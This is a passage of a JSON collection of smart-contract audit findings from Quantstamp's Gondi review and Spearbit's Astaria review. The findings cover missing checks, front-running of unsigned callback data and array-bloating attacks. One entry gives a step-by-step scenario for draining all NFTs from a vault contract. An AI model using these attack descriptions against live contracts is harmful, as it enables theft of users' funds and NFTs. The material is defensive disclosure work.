`MultiSourceLoan.updateRefinanceInterestFraction()`: Validate that `_newFraction` is lower than `PRECISION.`\n9.   `AuctionLoanLiquidator.placeBid()`: Validate that `_bid` is greater than zero, as else a bid of zero amount could technically win the auction.\n10.   `WithCallbacks.addWhitelistedCallbackContract()`: Validate that `_contract` is non-zero and `_tax` is lower than `PRECISION`.\n11.   `AddressManager._add()`: Validate that `entry` is valid. Otherwise, it would allow `address(0)` to be added to the registry.\n\n**Recommendation:** We recommend adding the relevant checks.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Quantstamp",
      "protocol_name": "Gondi",
      "source_link": "https://certificate.quantstamp.com/full/gondi/43da11ee-5eec-406b-95e4-4fbf423fc2cc/index.html",
      "github_link": "",
      "tags": [],
      "finders": [
        "Ibrahim Abouzied",
        "Julio Aguliar",
        "Ruben Koch"
      ]
    },
    {
      "id": "60038",
      "title": "Unpaid Protocol Proceeds Fee in Loan Renegotiation",
      "impact": "LOW",
      "content": "**Update**\nThe proceeds mechanic got removed in commit `f4279fef22a11d9b288dc378b2dd764c0a3fd166`, so the issue no longer applies.\n\n**File(s) affected:**`MultiSourceLoan.sol`\n\n**Description:** The function `MultiSourceLoan._clearProceeds()` calculates a fee on top of the accumulated proceeds interest the borrower has to pay in addition to the accrued proceeds interest. This value is returned to the calling function, which is then expected to take care of the fee transfer.\n\nWhile in loan repayments, the proceeds fee is transferred from the borrower to the fee recipient, the protocol fails to claim the proceeds fee in case of loan renegotiations. The value of the unsent fees from the proceeds are passed regardless into the emission of the `ProceedsCleared()` event.\n\n**Recommendation:** Add a transfer of `totalProtocolFee` to the fee recepient in case of loan renegotiations.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Quantstamp",
      "protocol_name": "Gondi",
      "source_link": "https://certificate.quantstamp.com/full/gondi/43da11ee-5eec-406b-95e4-4fbf423fc2cc/index.html",
      "github_link": "",
      "tags": [],
      "finders": [
        "Ibrahim Abouzied",
        "Julio Aguliar",
        "Ruben Koch"
      ]
    },
    {
      "id": "60037",
      "title": "Greedy `UserVault` Contract",
      "impact": "LOW",
      "content": "**Update**\nMarked as \"Fixed\" by the client. Addressed in: `27e62624bd9ffae5c4f4a6c85b2ba2d2a5a3e366`.\n\n**File(s) affected:**`UserVault.sol`\n\n**Description:** The `UserVault` contract provides both a `fallback()` and `receive()` function. All native tokens deposited via direct transfers would be forever stuck in the contract, as only funds received via `depositEth()` would ever be withdrawable.\n\n**Recommendation:** Remove both the `fallback()` and `receive()` function from the contract.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Quantstamp",
      "protocol_name": "Gondi",
      "source_link": "https://certificate.quantstamp.com/full/gondi/43da11ee-5eec-406b-95e4-4fbf423fc2cc/index.html",
      "github_link": "",
      "tags": [],
      "finders": [
        "Ibrahim Abouzied",
        "Julio Aguliar",
        "Ruben Koch"
      ]
    },
    {
      "id": "60036",
      "title": "Unexpectedly High Tax for Borrower",
      "impact": "LOW",
      "content": "**Update**\nMarked as \"Fixed\" by the client. Addressed in: `abd99ad352b9f397f003eea31693daf024fccf79`.\n\n**File(s) affected:**`MultiSourceLoan.sol`\n\n**Description:** In case borrowers draw from a line of credit with some maximum capacity, the possible `taxCost` the borrower has to pay to the lender should not be based on the loan's maximum size, i.e. `offer.principalAmount`, but instead be based on the value the borrower is borrowing, which is the value of the `amount` variable.\n\n**Recommendation:** Base the `taxCost` to be paid off of the `amount` value, not the `offer.principalAmount` value.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Quantstamp",
      "protocol_name": "Gondi",
      "source_link": "https://certificate.quantstamp.com/full/gondi/43da11ee-5eec-406b-95e4-4fbf423fc2cc/index.html",
      "github_link": "",
      "tags": [],
      "finders": [
        "Ibrahim Abouzied",
        "Julio Aguliar",
        "Ruben Koch"
      ]
    },
    {
      "id": "60035",
      "title": "Possible Reentrancy When Creating Loans",
      "impact": "LOW",
      "content": "**Update**\nThe `emitLoanMany()` function has been removed in commit `cce2e1dc7468b5eb23ea4d0c7c57eca093eecde2`, so the issue no longer applies.\n\n**File(s) affected:**`MultiSourceLoan.sol`\n\n**Description:** The `emitLoan()` function is guarded by the `nonReentrant` modifier to protect against reentrancy. However, the `emitLoanMany()` function is missing the modifier, allowing users to circumvent the protection.\n\n**Recommendation:** Though no exploit was identified, add the `nonReentrant` modifier to the `emitLoanMany()` function to further protect the contract.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Quantstamp",
      "protocol_name": "Gondi",
      "source_link": "https://certificate.quantstamp.com/full/gondi/43da11ee-5eec-406b-95e4-4fbf423fc2cc/index.html",
      "github_link": "",
      "tags": [],
      "finders": [
        "Ibrahim Abouzied",
        "Julio Aguliar",
        "Ruben Koch"
      ]
    },
    {
      "id": "60034",
      "title": "Loan Requests with Unspecified Lender Can Behave Unexpectedly",
      "impact": "LOW",
      "content": "**Update**\nMarked as \"Fixed\" by the client. Addressed in: `21ad657dd4bfed780fdca288bc4ea3af444167dd`.\n\n**File(s) affected:**`MultiSourceLoan.sol`, `BaseLoan.sol`\n\n**Description:** A borrower can request a loan that any lender can take by specifying a `LoanOffer` with an unspecified `lender` field.\n\nIf for some reason, a borrower would ever sign a collection loan offer request with an unspecified lender, yet `capacity > 0`, there is the potential for unexpected behavior if some conditions are met. In general, all loan requests with unspecified lenders about to be put on-chain via `emitLoan()` can be front-ran by other lenders to overtake the loan. The only requirement for such cases would be that the front-running lender replaces their address in the `LoanExecutionData.lender` field.\n\nThere are more specific cases, depending on the `offer.capacity` field.\n\nIn cases of `offer.capacity > 0`:\n\n*   Other borrowers can mark the capacity of that loan as used under loan conditions they fully determine themselves, as long as the lender in the `LoanOffer` also remains unspecified and the `offerId` matches, since `_used[offer.lender][offer.offerId]` would be shared between the two separate loans. However, `capacity > 0` for borrower-signed loan requests seems rather unuseful, as the borrower is required to sign off a specific NFT to use, which could only be repeatedly used if a loan is repaid before the underlying loan offer expires.\n\nIn case `offer.capacity == 0`:\n\n*   Anyone can deny such a loan request by front-running the emitting of the loan with an arbitrary loan that also leaves the lender unspecified and matches the `offerId` of the other loan. As the two loans share the unspecified lender and `offerId` can be arbitrarily forged, it is marked as canceled in the `isOfferCancelled` mapping.\n\n**Recommendation:** In case `offer.lender` remained unspecified, consider using the borrower in the first index of the `used` mapping.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Quantstamp",
      "protocol_name": "Gondi",
      "source_link": "https://certificate.quantstamp.com/full/gondi/43da11ee-5eec-406b-95e4-4fbf423fc2cc/index.html",
      "github_link": "",
      "tags": [],
      "finders": [
        "Ibrahim Abouzied",
        "Julio Aguliar",
        "Ruben Koch"
      ]
    },
    {
      "id": "60033",
      "title": "Lenders Can Claim NFT With Last-Second Full Loan Refinance",
      "impact": "LOW",
      "content": "**Update**\nMarked as \"Acknowledged\" by the client. The client provided the following explanation:\n\n> \"We thought already about this and it's fine. All solutions are worse than existing state given they require defining a time window.\"\n\n**File(s) affected:**`MultiSourceLoan.sol`\n\n**Description:** Loans can be refinanced at any moment by any lender. If a borrower defaults on the loan, the NFT would get automatically transferred to the lender (if there is a single lender). Since there is also no constraint to refinancing besides making the loan better for the borrower, lenders might front-run each other for full refinance requests at the end of the loan duration to get the NFT. As it is fairly unlikely that a loan will be paid back in one of the last blocks, there is no downside for lenders to engage in such behaviour, if the NFT is worth more than the principal.\n\nGiven that the loan would have a very small duration left, a refinance with e.g. the minimum possible APR of 0.01% of would not leave the new lender's funds ineffectively idle for long, yet make follow-up refinances impossible, locking the NFT claim to the lender in case of loan default.\n\n**Recommendation:** Provide end-user-facing documentation detailing this fact. Alternatively, consider mitigating this by not allowing refinances without significantly extended loan duration once the remaining duration of the loan has gone below some threshold. As some duration would be left, the borrower might still have the opportunity to repay the loan to reclaim the NFT themselves, increasing the risk of idle funds for last second full refinances before the threshold is reached.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Quantstamp",
      "protocol_name": "Gondi",
      "source_link": "https://certificate.quantstamp.com/full/gondi/43da11ee-5eec-406b-95e4-4fbf423fc2cc/index.html",
      "github_link": "",
      "tags": [],
      "finders": [
        "Ibrahim Abouzied",
        "Julio Aguliar",
        "Ruben Koch"
      ]
    },
    {
      "id": "60032",
      "title": "Funds Could Get Stuck In Leverage Contract",
      "impact": "LOW",
      "content": "**Update**\nMarked as \"Fixed\" by the client. Addressed in: `753c5272f216e2944adac852517c1bc5d84a3a71`.\n\n**File(s) affected:**`Leverage.sol`\n\n**Description:** The `Leverage` contract can be used for protocol interactions paired with callbacks to execute once principal from a loan is received (`Leverage.afterPrincipalTransfer()`) or the loan's underlying collateral is received (`Leverage.afterNFTTransfer()`).\n\nHowever, in both of these callbacks, funds could get permanently stuck in the contract, as the `afterPrincipalTransfer()` callback assumes that the combination of `msg.value` and the loan's principal will exactly cover the purchase attempted in the callback. In `afterNFTTransfer()` the returned amount is also specified in the callback data and might not be fully aligned with the received funds.\n\n**Recommendation:** As the contract is not intended to hold any funds, we believe the contract should simply return the contract balance, if the contract balance is greater than any specified amount.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Quantstamp",
      "protocol_name": "Gondi",
      "source_link": "https://certificate.quantstamp.com/full/gondi/43da11ee-5eec-406b-95e4-4fbf423fc2cc/index.html",
      "github_link": "",
      "tags": [],
      "finders": [
        "Ibrahim Abouzied",
        "Julio Aguliar",
        "Ruben Koch"
      ]
    },
    {
      "id": "60031",
      "title": "Privileged Roles and Ownership",
      "impact": "LOW",
      "content": "**Update**\nThe client marked the issue as \"Acknowledged\".\n\n**Description:** Certain contracts have state variables, e.g. `owner`, which provide certain addresses with privileged roles. Such roles may pose a risk to end-users.\n\nFor a detailed list of roles per contract see the following list:\n\nThe owner of the `MultiSourceLoan` contract has access to:\n\n1.   `setDelegateRegistry()` to update the delegate registry\n2.   `setMaxSources()` to update the total number of sources a loan's principal can be partitioned in.\n3.   `updateRefinanceInterestFraction()` to update the percentual share of how much of the delta of a refinanced source the original lender is entitled to in case of loan repayment and renegotiations.\n4.   `setFlashActionContract()` to update the address that a borrower can execute flash loans with when their asset is locked as collateral.\n5.   Via inheritance of the abstract `WithCallbacks` contract, the `MultiSourceLoan` contract furthermore has access to:\n\n a) `addWhitelistedCallbackContract()` and `removeWhitelistedCallbackContract()` to maintain the list of whitelisted callback contract instances that can reenter after the execution of callback hooks.\n6.   Via inheritance of the abstract `BaseLoan` contract, the `MultiSourceLoan` contract furthermore has access to:\n\n b) `updateProtocolFee()` and `setProtocolFee()`, offering a two-step update mechanism to overwrite the protocol fee deducted at various places in the protocol.\n\n c) `updateLiquidationContract()` to update the contract to use for liquidations. Overwriting this contract with incorrect values could cause the loss of all collateral of defaulted loans.\n\n d) `updateLiquidationAuctionDuration()` to update the base duration of the auction outside of the quiet-ending mechanic. \n\nThe owner of the `AuctionLoanLiquidator` contract has access to:\n\n1.   `addLoanContract()` and `removeLoanContract()` that maintains a list of approved loan contracts that this contract can perform liquidations for.\n2.   `updateTriggerFee()`, which enables the liquidator to specify the fees transferred to the initiators and finalizers of the liquidation process, with an upper bound of 0.5% for both. \n\nThe owner of the `AddressManager` contract has access to:\n\n1.   `add()`, `addtoWhiteList()`, `removeFromWhitelist()`, which maintains a list of whitelisted addresses. It is leveraged to maintain a whitelist of ERC20 tokens approved for principal/payments and a whitelist of ERC721 token addresses approved as collateral. The `Leverage` contract also maintains a list of the approved external marketplaces that can be used in loans emitted together with hooks. \n\nThe owner of the `Leverage` contract has access to:\n\n1.   `updateMultiSourceLoanAddressFirst()` and `finalUpdateMultiSourceLoanAddress()`, offering a two-step update mechanism to overwrite the address able to access the hook functions.\n2.   `updateSeaportAddressFirst()` and `finalUpdateSeaportAddress()`, offering a two-step update mechanism to update the `_seaport` address that can be used in external hooks.\n\n**Recommendation:** These privileges should be made clear to the users via documentation.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Quantstamp",
      "protocol_name": "Gondi",
      "source_link": "https://certificate.quantstamp.com/full/gondi/43da11ee-5eec-406b-95e4-4fbf423fc2cc/index.html",
      "github_link": "",
      "tags": [],
      "finders": [
        "Ibrahim Abouzied",
        "Julio Aguliar",
        "Ruben Koch"
      ]
    },
    {
      "id": "60030",
      "title": "Borrower Lacks Capability to Cancel Requests",
      "impact": "LOW",
      "content": "**Update**\nMarked as \"Fixed\" by the client. Addressed in: `7916710f87139597202127455a5e18a0ed844f1c`.\n\nThe borrower can now also cancel requests.\n\n**File(s) affected:**`MultiSourceLoan.sol`, `BaseLoan.sol`\n\n**Description:** The `LoanOffer` struct used to publish a loan on-chain supports multiple flows where finally, both borrower and lender are required to commit to the `LoanOffer` for a loan to be initiated, either via a signature or by being the sender of the transaction.\n\nA borrower can sign the `ExecutionData` containing a loan they would like to request and either provide a specific lender able to carry out the loan request or leave that field unset to enable anyone to lend the principal. Once they have signed such an `ExecutionData`, it is impossible for the requesting borrower to cancel the request. The only way a borrower can prevent the loan request from being filled is by revoking the approval of the specified NFT or by waiting for the loan request to expire.\n\nThis is asymmetrical to the capabilities of a lender, who can cancel certain loan offers of a certain `offerId` at any time via `cancelOffer()` or `cancelRenegotiationOffer()`.\n\n**Recommendation:** Provide the capability to the borrower to cancel loan requests too and add the checks for it as part of the `_validateExecutionData()` function call.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Quantstamp",
      "protocol_name": "Gondi",
      "source_link": "https://certificate.quantstamp.com/full/gondi/43da11ee-5eec-406b-95e4-4fbf423fc2cc/index.html",
      "github_link": "",
      "tags": [],
      "finders": [
        "Ibrahim Abouzied",
        "Julio Aguliar",
        "Ruben Koch"
      ]
    },
    {
      "id": "60029",
      "title": "Missing Existence Check in Vault",
      "impact": "LOW",
      "content": "**Update**\nMarked as \"Fixed\" by the client. Addressed in: `27e62624bd9ffae5c4f4a6c85b2ba2d2a5a3e366` and `753c5272f216e2944adac852517c1bc5d84a3a71`.\n\nA `vaultExists` modifier has been added to perform an existence check prior to deposits.\n\n**File(s) affected:**`UserVault.sol`\n\n**Description:** None of the deposit functions validate that the provided vault exists. The NatSpec comment above `depositNft()` states that the Gondi team does not check that the vault exists and it is the responsibility of the caller to make sure of that.\n\nHowever, the DeFi user experience is still very poor and is therefore error-prone, especially for the vast majority of (new) users. Not validating that the vault exists could lead to users being unable to withdraw their NFTs, ERC20s, and ETH since they would have to first burn the non-existent vault ID which would revert.\n\n**Recommendation:** Validate that the vault exists prior to any deposits via a comparison with `totalSupply`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Quantstamp",
      "protocol_name": "Gondi",
      "source_link": "https://certificate.quantstamp.com/full/gondi/43da11ee-5eec-406b-95e4-4fbf423fc2cc/index.html",
      "github_link": "",
      "tags": [],
      "finders": [
        "Ibrahim Abouzied",
        "Julio Aguliar",
        "Ruben Koch"
      ]
    },
    {
      "id": "60028",
      "title": "Proceeds Array Can Be Arbitrarily Extended",
      "impact": "HIGH",
      "content": "**Update**\nMarked as \"Fixed\" by the client. Addressed in: `f4279fef22a11d9b288dc378b2dd764c0a3fd166`.\n\nThe proceeds mechanic has been fully removed in the specified commit. Therefore, the issue is no longer relevant.\n\n**File(s) affected:**`MultiSourceLoan.sol`\n\n**Description:** In partial and full refinances, refinanced sources continue to receive a portion of the difference between the APR they originally offered and the APR the currently refinancing source offers. This concept is called proceeds and theoretically continues to accrue interest until a loan is repaid or renegotiated. This incentivizes early lenders to accept loans, as they might receive a passive income stream in return even if they get immediately refinanced.\n\nThese proceeds are tracked in a separate dynamically sized array as part of the `Loan` struct. It is traversed and possibly appended to in nearly all interactions with a loan. It can become fully discarded only via renegotiations, where all proceeds are paid off by the borrower. In case of liquidations, the proceeds are not considered.\n\nThe proceeds are only paid out in case of renegotiations and loan repayment. The array is appended to for each source that is being refinanced, so `_loan.sources.length` elements per transaction. It should be noted that the maximum number of sources a loan can be partitioned in is capped by `MultiSourceLoan._maxSources`, which according to the documentation will be set to ten. While in most cases, only a full refinance would possibly extend the array by e.g. ten, leaving follow-up refinances to only extend the array by one, a malicious user could possibly fully refinance all sources not via `refinanceFull()` but via `refinancePartially()`, refinancing each of the e.g. all ten sources individually, creating ten new entries in the `proceeds` array, while the loan continues to have ten active sources. With each such refinance, the proceeds array would grow by ten elements.\n\nIf a user attempts to repay or renegotiate such a loan, they would be forced to settle the interest accumulated by all proceeds. This would require an ERC20 transfer for each of the refinanced sources throughout a loan's lifetime (or until its last renegotiation). The gas costs of an ERC20 `transferFrom()` call differ by implementation, but can be approximated by 65000 gas. With a block gas limit of 30 million on mainnet, there is a rough theoretical capacity of 461 transfers that can be handled within one transaction, though the reality will be much lower than that, given all the associated gas costs of e.g. the `repayLoan()` function.\n\nWhile significant gas costs would be associated with performing such a bloating attack, it would force a borrower into liquidation.\n\n**Recommendation:** Switch to proceeds, where users can withdraw funds tracked in some `totalProceeds` mapping that gets increased any time the funds would be pushed to the original lender.",
      "summary": "\nThe bug report discusses a problem with the \"proceeds\" mechanic in the `MultiSourceLoan.sol` file. This mechanic allows refinanced sources to receive a portion of the difference between the original APR and the new APR, potentially leading to passive income for early lenders. However, this mechanic has been removed in a recent update. The report explains that the proceeds were tracked in a separate array and could only be paid out through renegotiations or loan repayment. However, a malicious user could exploit this by repeatedly refinancing sources, causing the proceeds array to grow and potentially forcing the borrower into liquidation. The recommendation is to switch to a new method of tracking proceeds to prevent this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Quantstamp",
      "protocol_name": "Gondi",
      "source_link": "https://certificate.quantstamp.com/full/gondi/43da11ee-5eec-406b-95e4-4fbf423fc2cc/index.html",
      "github_link": "",
      "tags": [],
      "finders": [
        "Ibrahim Abouzied",
        "Julio Aguliar",
        "Ruben Koch"
      ]
    },
    {
      "id": "60027",
      "title": "Unsigned Callback Data",
      "impact": "HIGH",
      "content": "**Update**\nMarked as \"Fixed\" by the client. Addressed in: `a05d5e8223351b0a3466bd1bcde507493fde0f24`.\n\nThe callback data in all cases is now always required to be signed by the borrower if the borrower is not `msg.sender`.\n\n**File(s) affected:**`Leverage.sol`, `MultiSourceLoan.sol`\n\n**Description:** The protocol enables the initialization and repayment of loans paired with callback data, which enables hooks to whitelisted contracts with provided calldata. With that, users can take a loan with the principal of the to-be-taken loan being used to buy the collateral in the first place (\"buy now pay later\"/\"BNPL\"). It can also be used to pair the selling of the NFT directly with its repayment.\n\nFor such a request, the borrower does not necessarily need to be the `msg.sender`, but can also sign parts of the loan information instead, which is then verified on-chain. However, the callback data for the hooks remains unsigned, which is very problematic, as front-runners can replace the callback data. This is problematic in both cases of the hook usage:\n\nFor loan repayments via selling `_repaymentData.callbackData` can be arbitrarily adjusted to possibly perform market sells of the NFT to repay the loan that return just enough funds to the borrower to cover the loan expenses. While the contract being interacted with still has to be whitelisted, any data regarding which function to invoke with what values and how much (w)ETH to transfer can be manipulated. While this is still a fairly constrained environment, where a certain contract has to be invoked and enough funds have to be made accessible to the borrower to repay the loan (assuming they currently do not have any available), it can leave the borrower at a significant loss.\n\nFor example, assume a borrower took a 1 ETH loan with 1% APR against a 50 ETH floor price NFT and wants to repay the loan after a year by selling the NFT and get the rest of the profit. If they sign as part of the `LoanRepaymentData`, anyone can replace the `callbackData` in that struck to edit in a sale to an offer as low as 1.1 ETH to settle all necessary debt, leaving the borrower at a massive loss.\n\n*   For BNPL interactions, where a loan is taken and from the lended principal the collateral is purchased via the `_handleAfterPrincipalTransferCallback()`, the `callbackData` too could be replaced in a way that could be unintended for the borrower. While the function seems to be designed for leveraged buys, where the loan is fully used with added funds from the borrower (see [GON-7](https://certificate.quantstamp.com/full/gondi/43da11ee-5eec-406b-95e4-4fbf423fc2cc/index.html#findings-qs7)), it is still an unnecessary risk to leave the `callbackData` unsigned.\n\nWhile it should be noted that such an attack seems not possible for Seaport offer filling, as both parties need to have signed and thereby agreed upon an offer beforehand, but Seaport is just one of the planned integrations and the code is already present to seamlessly integrate more that possibly have looser constraints.\n\n**Recommendation:** Non-zero `LoanExecutionData.callbackData` should be signed by the borrower, as well as non-zero `LoanRepaymentData.callbackData`in case of repayments.",
      "summary": "\nThe client has marked a bug as \"Fixed\" in the code. The bug affected the `Leverage.sol` and `MultiSourceLoan.sol` files and involved callback data for loan repayment and initialization. The bug allowed front-runners to manipulate the callback data, potentially causing financial loss for borrowers. The bug could also affect BNPL interactions, where the callback data could be replaced in unintended ways. The recommendation is to have the borrower sign the callback data to prevent these issues.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Quantstamp",
      "protocol_name": "Gondi",
      "source_link": "https://certificate.quantstamp.com/full/gondi/43da11ee-5eec-406b-95e4-4fbf423fc2cc/index.html",
      "github_link": "",
      "tags": [],
      "finders": [
        "Ibrahim Abouzied",
        "Julio Aguliar",
        "Ruben Koch"
      ]
    },
    {
      "id": "60026",
      "title": "Missing Ownership Check In Vault",
      "impact": "HIGH",
      "content": "**Update**\nMarked as \"Fixed\" by the client. Addressed in: `37fd1a6c3040d1a7f685e487715c0c9de9be827a`.\n\n**File(s) affected:**`UserVault.sol`\n\n**Description:** Users can bundle up NFT and tokens in a special NFT called vaults via the `UserVault` contract. Tokens and NFTs bundled in such a vault are only accessible once the vault is burned again. The idea is that these vaults containing a set of NFTs and tokens can be used as collateral, as they give the owner access to the underlying assets once it is burned. The contract provides multiple functions to withdraw the different assets. While `withdrawTokens()` and `_withdrawEth()` work as expected, the `_withdrawNfts()` function does not check whether the vault held possession of the to-be-withdrawn NFT. As the minting and burning of vaults are done permissionlessly, anyone can drain all NFTs the contract holds.\n\n**Exploit Scenario:**\n\n1.   A malicious user creates a vault via `UserVault.mint()`, receiving a `_vaultId`\n2.   In another transaction, the user calls `burnAndWithdraw()`, specifying the newly minted `_vaultId` and all NFTs they wish to drain. The `tokens` array must be kept empty, as it has proper checks in place that would cause the transaction to revert if the user would specify tokens to withdraw they did not previously deposited.\n3.   In the `_withdrawNft()` function, the `onlyReadyForWithdrawal` modifier would pass, as the user is registered in the `_readyForWithdrawal` mapping for the `_vaultId`.\n4.   The NFT is transferred and the entry in the `_vaultNfts[_collection][_tokenId]` mapping is deleted, without assuring that its previous value matched the specified `_vaultId`. That way, all NFTs are accessible through any vault.\n\n**Recommendation:** Assure that `_vaultNfts[_collection][_tokenId] == _vaultId` before allowing the transfer in `_withdrawNft()`. Also, follow the Check-Effects-Interacts-pattern for best practice.",
      "summary": "\nThe client has marked the bug as \"Fixed\" in the `UserVault.sol` file. The contract allows users to bundle up NFTs and tokens in a special NFT called vaults, which can be used as collateral. However, the `_withdrawNfts()` function does not check if the vault actually holds the NFT before transferring it, allowing anyone to drain all the NFTs the contract holds. To fix this, the report recommends checking if the specified NFT belongs to the specified vault before transferring it.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Quantstamp",
      "protocol_name": "Gondi",
      "source_link": "https://certificate.quantstamp.com/full/gondi/43da11ee-5eec-406b-95e4-4fbf423fc2cc/index.html",
      "github_link": "",
      "tags": [],
      "finders": [
        "Ibrahim Abouzied",
        "Julio Aguliar",
        "Ruben Koch"
      ]
    },
    {
      "id": "21866",
      "title": "Multicall when inherited to ERC4626RouterBase does not bubble up the reverts correctly",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- Multicall.sol#L22-L29\n\n## Description\nMulticall does not bubble up the reverts correctly. The current implementation uses the following snippet to bubble up the reverts:\n\n```solidity\n// https://github.com/AstariaXYZ/astaria-gpl/blob/.../src/Multicall.sol\npragma solidity >=0.7.6;\nif (!success) {\n    // Next 5 lines from https://ethereum.stackexchange.com/a/83577\n    if (result.length < 68) revert();\n    assembly {\n        result := add(result, 0x04)\n    }\n    revert(abi.decode(result, (string)));\n}\n```\n\n```solidity\n// https://github.com/AstariaXYZ/astaria-gpl/blob/.../src/ERC4626RouterBase.sol\npragma solidity ^0.8.17;\n...\nabstract contract ERC4626RouterBase is IERC4626RouterBase, Multicall { ... }\n```\n\nThis method of bubbling up does not work with new types of errors:\n- Panic(uint256) 0.8.0 (2020-12-16)\n- Custom errors introduced in 0.8.4 (2021-04-21)\n\n## Recommendation\nTo bubble up the reverts correctly, we can revert like the following, but it requires updating the Multicall's pragma to `solidity >=0.8.13` (due to using \"memory-safe\"):\n\n```solidity\nassembly (\"memory-safe\") {\n    if iszero(success) {\n        revert(add(result, 32), mload(result))\n    }\n}\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Jonah1005",
        "Blockdev"
      ]
    },
    {
      "id": "21865",
      "title": "TRANSFER_PROXY is not queried in a consistent fashion.",
      "impact": "LOW",
      "content": "## Low Risk Severity Report\n\n## Context\n- **CollateralToken.sol#L167**\n- **LienToken.sol#L419**\n- **AstariaRouter.sol#L204**\n- **Deploy.sol#L84**\n\n## Description\nDifferent usages of `TRANSFER_PROXY` and how it is queried:\n- **AstariaRouter**: Used in `pullToken(...)` to move tokens from the `msg.sender` to another address.\n- **CollateralToken**: Used in `validateOrder(...)` where Seaport has callbacked into. Here, CollateralToken gives approval to `TRANSFER_PROXY`, which is queried from AstariaRouter for the settlement tokens. `TRANSFER_PROXY` is also used to transfer tokens.\n- **LienToken**: In `in_payment(...)`, `TRANSFER_PROXY` is used to transfer tokens from CollateralToken to the lien owner. This implies that the `TRANSFER_PROXY` used in CollateralToken should be the same that is used in LienToken.\n\nTherefore, from the above, we see that:\n1. `TRANSFER_PROXY` holds token approvals for ERC20 or wETH tokens used as lien tokens.\n2. `TRANSFER_PROXY`'s address should be the same at all call sites for the different contracts: AstariaRouter, CollateralToken, and LienToken.\n3. Except for CollateralToken, which queries `TRANSFER_PROXY` from AstariaRouter, the other two contracts (AstariaRouter and LienToken) read this value from their storage.\n\nNote that the deployment script assigns the same `TRANSFER_PROXY` to all three main contracts in the codebase: AstariaRouter, CollateralToken, and LienToken.\n\n## Recommendation\nTo guarantee that `TRANSFER_PROXY` is the same for all three contracts, we can redesign the codebase as follows:\n1. Only allow one contract (maybe AstariaRouter) to file an update for `TRANSFER_PROXY`. Upon filing this update, we would call the other two contracts to update their corresponding `TRANSFER_PROXY` value in storage so that this value remains in sync. This would save gas since querying this value would read from the current contract in scope compared to reading it from another contract's storage.\n2. Only query the `TRANSFER_PROXY` from the current contract's storage.\n\n## Astaria\nTransferProxy is now queried from the AstariaRouter:\n- **PR 342**\n- **PR 342**\n\nThe applied solution bears the cost of querying the transfer proxy on the users, as opposed to the suggestion from the above recommendation.\n\n## Spearbit\nFixed.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Jonah1005",
        "Blockdev"
      ]
    },
    {
      "id": "21864",
      "title": "Filing to update one of the main contract for another main contract lacks validation",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context:\n- AstariaRouter.sol#L402-L409\n- CollateralToken.sol#L330-L332\n- LienToken.sol#L87-L90\n\n## Description:\nThe main contracts `AstariaRouter`, `CollateralToken`, and `LienToken` all need to be aware of each other and form a connected triangle. They are all part of a single unit and perhaps are separated into three different contracts due to code size and needing to have two individual ERC721 tokens. Their authorised filing structure is as follows:\n- Note that one cannot file for `CollateralToken` to change `LienToken` as the value of `LienToken` is only set during the `CollateralToken`'s initialisation.\n\nIf one files to change one of these nodes and forgets to check or update the links between these contracts, the triangle above would be broken.\n\n## Recommendation:\nTo ensure the connectivity of the above triangle:\n1. Each contract/node has two storage variables for the other two nodes.\n2. Each node should have an authorised endpoint to file updates for the other two nodes.\n3. Once a link has been established between two nodes, the changes should be propagated to the third node to ensure connectivity.\n\nOne can also have a different design where there is an external contract that manages the nodes and their links:\n\nTo swap one of these nodes, we would:\n1. Each contract/node has two storage variables for the other two nodes.\n2. Each node has a restricted `fileNode` endpoint which accepts one or two arguments (depends on the design) for the changed/swapped nodes, and only the `NodeManager` can call this to update the internal storage of the called node pointing to the other nodes.\n3. `NodeManager` should have an authorised endpoint that can be called to swap one or more of the nodes, which the `NodeManager` would need to propagate the changes to all the nodes. The new node would need to set its `NodeManager` upon initialisation or construction.\n\nIf the above changes are not applied, we need to monitor that the triangle is intact when a node is swapped.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Jonah1005",
        "Blockdev"
      ]
    },
    {
      "id": "21863",
      "title": "CollateralToken 'stokenURI uses the underlying assets's tokenURI",
      "impact": "LOW",
